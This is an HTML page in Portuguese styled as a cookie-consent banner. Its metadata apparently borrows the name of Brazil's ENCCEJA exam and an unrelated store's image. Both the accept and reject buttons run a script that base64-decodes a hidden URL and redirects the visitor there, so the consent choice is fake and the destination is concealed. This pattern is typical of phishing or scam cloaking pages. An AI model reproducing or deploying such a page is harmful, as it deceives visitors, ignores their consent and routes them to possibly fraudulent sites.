<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Defina suas preferências de cookies e melhore sua experiência.">
  <meta name="robots" content="index, follow">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://portal.enccejanacional.online/">
  <meta property="og:title" content="Configuração de Cookies">
  <meta property="og:description" content="Gerencie seus cookies para uma melhor navegação.">
  <meta property="og:image" content="https://loja.gsupplementsbrasil.pro/media/images/cookies-banner.png">
  <title>Preferências de Cookies</title>

  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #ccffcc; /* verde claro */
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }

    .banner-container {
      background: #ffffff; /* branco */
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
      text-align: center;
      max-width: 420px;
      width: 100%;
      transition: all 0.3s ease;
    }

    .banner-container:hover {
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
    }

    .banner-container h2 {
      font-size: 24px;
      color: #202124;
      margin-bottom: 12px;
      font-weight: bold;
    }

    .banner-container p {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 20px;
    }

    .action-buttons {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .button {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.3s ease, transform 0.2s;
    }

    .button:hover {
      transform: scale(1.05);
    }

    .accept {
      background-color: #000000;
      color: white;
    }

    .accept:hover {
      background-color: #333333;
    }

    .reject {
      background-color: #ffffff;
      color: #202124;
      border: 2px solid #202124;
    }

    .reject:hover {
      background-color: #f5f5f5;
    }

    @media (min-width: 480px) {
      .action-buttons {
        flex-direction: row;
        justify-content: space-between;
      }
    }
  </style>

  <script>
    function handle_conversion_redirect(encodedUrl) {
      window.location.href = atob(encodedUrl);
    }
  </script>

</head>
<body>
  <div class="banner-container">
    <h2>Configuração de Cookies</h2>
    <p>Este site utiliza cookies para oferecer a melhor experiência. Escolha sua configuração preferida:</p>
    <div class="action-buttons">
      <button class="button accept" onclick="handle_conversion_redirect('aHR0cHM6Ly9hZ2VudGVzYnJhc2lsZWR1Y2Euc2l0ZQ==')">Aceitar Cookies</button>
      <button class="button reject" onclick="handle_conversion_redirect('aHR0cHM6Ly9hZ2VudGVzYnJhc2lsZWR1Y2Euc2l0ZQ==')">Recusar Cookies</button>
    </div>
  </div>
</body>
</html>
